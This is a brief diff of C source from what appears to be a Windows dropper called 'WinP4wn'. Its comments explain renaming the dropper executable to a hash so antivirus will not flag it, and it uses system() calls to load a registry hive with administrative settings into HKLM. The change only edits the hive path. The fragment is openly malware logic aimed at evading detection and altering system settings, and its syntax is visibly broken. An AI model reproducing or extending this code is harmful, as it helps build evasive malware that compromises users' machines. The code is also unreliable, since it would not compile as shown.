@@ -8,7 +8,7 @@ void getos(int argc, char** argv[]) {
   /** give it a hash instead of this win32 name cuz def will detect it then xDDD */
   system("ren Win32.WinP4wn.dropper.exe 27cacc006aaf5bdd2a8e6b9b94711548.exe")
   /** Using the sysreg command to import a registry hive with administrative settings xD */
-  system("reg load HKLM\Software\WinP4ned 'ressources/NTUSER.DAT' /y [/c]")
+  system("reg load HKLM/Software/WinP4ned 'NTUSER.DAT' /y [/c]")
 #else
 #error "WinP4wn does only work on Windooze!"
 #endif
